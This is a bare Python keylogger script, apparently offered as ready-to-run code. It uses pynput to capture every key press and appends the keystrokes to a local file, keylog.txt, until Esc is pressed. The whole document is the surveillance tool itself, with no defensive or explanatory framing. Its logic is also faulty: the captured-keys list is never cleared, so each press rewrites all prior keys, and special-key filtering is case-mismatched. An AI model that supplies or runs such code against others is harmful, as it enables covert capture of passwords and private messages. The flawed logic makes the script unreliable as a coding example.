import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_to_file(keys)

def write_to_file(keys):
    with open('keylog.txt', 'a') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(' ')
            elif k.find("key") == -1:
                file.write(k)
            elif len(k) > 1:
                file.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
